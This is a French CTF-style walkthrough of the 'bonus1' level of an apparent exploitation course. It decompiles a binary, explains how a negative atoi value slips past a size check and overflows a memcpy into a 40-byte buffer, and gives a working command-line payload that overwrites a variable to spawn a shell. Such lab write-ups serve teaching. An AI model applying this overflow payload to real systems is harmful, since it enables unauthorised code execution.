# **Bonus 1**

Pour le bonus01, on decompile le code pour y voir plus claire.
```
undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 uVar1;
  undefined local_3c [40];
  int local_14;
  
  local_14 = atoi(*(char **)(param_2 + 4));
  if (local_14 < 10) {
    memcpy(local_3c,*(void **)(param_2 + 8),local_14 * 4);
    if (local_14 == 0x574f4c46) {
      execl("/bin/sh","sh",0);
    }
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```
On observe une comparaison apres un `memcpy` (void *memcpy(void *dest, const void *src, size_t n);).
On peut voir aussi une verification sur un retour d'atoi qui nous empeche d'acceder au memcpy si le retour est >= a 10.
On constate que notre `retour d'atoi` est utilise pour le `nombre d'octet` a copie dans memmcpy.
Notre objectif est donc de reussir a faire passer un nombre plus grand que la taille de notre buffer (40) apres la verification d'atoi.
Or, on constate que le derniere argument de memcpy est de type `size_t` -> `unsigned int`, donc si l'on passe un chiffre negatif en argument,
il va etre "valide" par le atoi mais va etre caster par la suite en unsigned int par memcpy.

![image](https://github.com/Seriots/rainfall/assets/94530285/1eeecfd0-e2a7-4f6a-9614-98936a1d5557)

![image](https://github.com/Seriots/rainfall/assets/94530285/34adb42a-c961-42db-8cde-ca15b240e630)

 On remarque donc qu'un `negatif` caster en `unsigned` int va `overflow`.
 Nous pouvons donc utiliser cela pour pouvoir ecrire plus dans notre variable `local_3c` et donc essayer d'`overwrite` `local_14`,
 pour lui donner comme valeur 0x574f4c46 -> 1464814662 et donc valider la comparaison qui execute le shell.

 Donc maintenant, l'objectif est d'`overflow` au dessus des 40 caracteres de notre buffer et de reecrire sur la valeur de local_14"
 `./bonus1 -2147483610 $(python -c print" 'A'*40 +'\x46\x4c\x4f\x57'")`

![image](https://github.com/Seriots/rainfall/assets/94530285/d63067c2-4217-4bc4-ac9d-cfaf5762844e)

> ### NEXT : [Bonus2](/bonus2/resources/README.md)
